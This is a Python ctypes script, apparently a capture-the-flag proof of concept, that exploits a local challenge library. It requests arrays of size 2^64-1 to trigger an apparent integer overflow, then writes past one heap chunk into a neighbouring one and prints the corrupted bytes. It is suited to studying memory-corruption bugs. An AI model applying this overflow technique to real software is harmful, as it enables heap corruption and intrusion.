import ctypes

lib = ctypes.CDLL("./libchal.so")
lib.init_arr.restype = ctypes.c_void_p
lib.malloc_array.argtypes = (ctypes.c_void_p, ctypes.c_uint64, ctypes.c_uint64)
lib.malloc_array.restype = ctypes.c_void_p
lib.write_array.argtypes = (ctypes.c_void_p, ctypes.c_uint64, ctypes.c_char_p)
lib.write_array.restype = ctypes.c_void_p
lib.read_array.argtypes = (ctypes.c_void_p, ctypes.c_uint64)
lib.read_array.restype = ctypes.c_void_p

lib.free_array.argtypes = (ctypes.c_void_p, ctypes.c_uint64)
lib.free_array.restype = ctypes.c_void_p
arr = lib.init_arr()
print(f"arr={arr:#x}")
for i in range(8):
    lib.malloc_array(arr, i, (1 << 64) - 1)
for i in range(8, 16):
    lib.malloc_array(arr, i, 0x18)
ptrs = [ctypes.c_void_p.from_address(arr + i * 8).value for i in range(16)]
for i, ptr in enumerate(ptrs):
    print(f"slot={i:02d} ptr={ptr:#x}")
sources = [(a, b) for a in range(8) for b in range(8, 16) if ptrs[a] < ptrs[b]]
src, dst = min(sources, key=lambda pair: ptrs[pair[1]] - ptrs[pair[0]])
distance = ptrs[dst] - ptrs[src]
print(f"chosen source={src} target={dst} distance={distance:#x}")
lib.write_array(arr, src, b"A" * (distance + 16))
print("target", ctypes.string_at(ptrs[dst], 24).hex())
